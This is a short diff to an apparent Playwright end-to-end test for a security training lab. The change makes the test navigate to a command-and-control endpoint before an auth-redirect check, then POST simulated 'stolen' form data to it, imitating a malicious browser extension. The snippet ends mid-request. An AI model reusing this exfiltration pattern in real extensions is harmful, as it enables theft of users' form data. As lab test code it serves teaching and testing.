@@ -86,8 +86,9 @@ dashboardTests('C2 Dashboard Display', () => {
     // ── 1. POST test data simulating what the malicious extension would send ─────
     // Browser extensions cannot be loaded in headless Playwright, so we POST
     // directly to the C2 endpoint to simulate extension-captured form data.
-    await skipIfAuthRedirect(page, 'Lab 3 C2 pre-check')
     const c2Url = currentEnv.lab3.c2  // /lab3/extension
+    await page.goto(c2Url, { waitUntil: 'domcontentloaded', timeout: 15000 })
+    await skipIfAuthRedirect(page, 'Lab 3 C2 pre-check')
     const response = await page.request.post(`${c2Url}/stolen-data`, {
       headers: { 'Content-Type': 'application/json' },
       data: {
